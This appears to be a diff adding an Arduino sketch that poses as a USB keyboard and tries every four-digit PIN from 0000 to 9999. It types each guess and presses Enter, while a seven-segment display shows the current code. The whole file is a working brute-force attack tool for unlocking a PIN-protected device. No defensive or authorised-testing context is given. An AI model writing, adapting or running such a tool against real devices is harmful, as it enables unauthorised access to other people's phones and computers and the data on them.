@@ -1,0 +1,180 @@
+uint8_t buf[8] = { 0 }; // byte with information about the "down" button
+
+void setup() 
+{
+  Serial.begin(9600); // Set the connection speed
+  pinMode(2, OUTPUT); // G
+  pinMode(3, OUTPUT); // F
+  pinMode(4, OUTPUT); // E
+  pinMode(5, OUTPUT); // D
+  pinMode(6, OUTPUT); // C
+  pinMode(7, OUTPUT); // B
+  pinMode(8, OUTPUT); // A
+  pinMode(9, OUTPUT); // D4
+  pinMode(10, OUTPUT); // D3
+  pinMode(11, OUTPUT); // D2
+  pinMode(12, OUTPUT); // D1
+
+// Since the module segment displays a common anode, in order to
+// Glowing segment concluded Arduino must be in high-impedance state
+// and vice versa
+
+// Turn off all segments:
+
+  digitalWrite(12, HIGH);
+  digitalWrite(11, HIGH);
+  digitalWrite(10, HIGH);
+  digitalWrite(9, HIGH);
+  delay(2000); // Pause to "keyboard" had time to decide on the system
+}
+
+void loop() 
+{
+  int dig1, dig2, dig3, dig4; // The figures, which will be administered sequentially
+  int keys[10] = { 39, 30, 31, 32, 33, 
+  34, 35, 36, 37, 38 }; // The array of ASCII digits from 0 to 9, respectively,
+
+// Iterate from 0000 to 9999:
+
+  for(dig1=0; dig1<10; dig1++)
+  {
+    for(dig2=0; dig2<10; dig2++)
+    {
+      for(dig3=0; dig3<10; dig3++)
+      {
+        for(dig4=0; dig4<10; dig4++)
+        {
+          pressKey(keys[dig1]);
+          pressKey(keys[dig2]);
+          pressKey(keys[dig3]);
+          pressKey(keys[dig4]);
+          pressKey(40); // The Enter key
+
+// The current password will be displayed for about 15 seconds (a little more input delay)
+// about four combinations per minute
+          for(int i=0; i<1200; i++)
+          {
+            digLED(12, dig1);
+            digLED(11, dig2);
+            digLED(10, dig3);
+            digLED(9, dig4);
+          }
+        }
+      }
+    }
+  }
+}
+
+void pressKey(int dig) // input function
+{
+  buf[2] = dig;
+  Serial.write(buf, 8); // press
+  buf[0] = 0;
+  buf[2] = 0;
+  delay(20);
+  Serial.write(buf, 8); // Release key
+  delay(300);
+}
+
+// Perhaps there are libraries for segment-LED, but I do not want to deal with them,
+// So the algorithm sketched bypass indicator segments
+
+void digLED(int pin, int dig) // Function to display digits on the display
+{
+  digitalWrite(pin, LOW);
+  switch(dig)
+  {
+  case 0:
+    digitalWrite(8, LOW);
+    digitalWrite(7, LOW);
+    digitalWrite(6, LOW);
+    digitalWrite(5, LOW);
+    digitalWrite(4, LOW);
+    digitalWrite(3, LOW);
+    digitalWrite(2, HIGH);
+    break;
+  case 1:
+    digitalWrite(8, HIGH);
+    digitalWrite(7, LOW);
+    digitalWrite(6, LOW);
+    digitalWrite(5, HIGH);
+    digitalWrite(4, HIGH);
+    digitalWrite(3, HIGH);
+    digitalWrite(2, HIGH);
+    break;
+  case 2:
+    digitalWrite(8, LOW);
+    digitalWrite(7, LOW);
+    digitalWrite(6, HIGH);
+    digitalWrite(5, LOW);
+    digitalWrite(4, LOW);
+    digitalWrite(3, HIGH);
+    digitalWrite(2, LOW);
+    break;
+  case 3:
+    digitalWrite(8, LOW);
+    digitalWrite(7, LOW);
+    digitalWrite(6, LOW);
+    digitalWrite(5, LOW);
+    digitalWrite(4, HIGH);
+    digitalWrite(3, HIGH);
+    digitalWrite(2, LOW);
+    break;
+  case 4:
+    digitalWrite(8, HIGH);
+    digitalWrite(7, LOW);
+    digitalWrite(6, LOW);
+    digitalWrite(5, HIGH);
+    digitalWrite(4, HIGH);
+    digitalWrite(3, LOW);
+    digitalWrite(2, LOW);
+    break;
+  case 5:
+    digitalWrite(8, LOW);
+    digitalWrite(7, HIGH);
+    digitalWrite(6, LOW);
+    digitalWrite(5, LOW);
+    digitalWrite(4, HIGH);
+    digitalWrite(3, LOW);
+    digitalWrite(2, LOW);
+    break;
+  case 6:
+    digitalWrite(8, LOW);
+    digitalWrite(7, HIGH);
+    digitalWrite(6, LOW);
+    digitalWrite(5, LOW);
+    digitalWrite(4, LOW);
+    digitalWrite(3, LOW);
+    digitalWrite(2, LOW);
+    break;
+  case 7:
+    digitalWrite(8, LOW);
+    digitalWrite(7, LOW);
+    digitalWrite(6, LOW);
+    digitalWrite(5, HIGH);
+    digitalWrite(4, HIGH);
+    digitalWrite(3, HIGH);
+    digitalWrite(2, HIGH);
+    break;
+  case 8:
+    digitalWrite(8, LOW);
+    digitalWrite(7, LOW);
+    digitalWrite(6, LOW);
+    digitalWrite(5, LOW);
+    digitalWrite(4, LOW);
+    digitalWrite(3, LOW);
+    digitalWrite(2, LOW);
+    break;
+  case 9:
+    digitalWrite(8, LOW);
+    digitalWrite(7, LOW);
+    digitalWrite(6, LOW);
+    digitalWrite(5, LOW);
+    digitalWrite(4, HIGH);
+    digitalWrite(3, LOW);
+    digitalWrite(2, LOW);
+    break;
+  }
+  delay(3);
+  digitalWrite(pin, HIGH);
+}
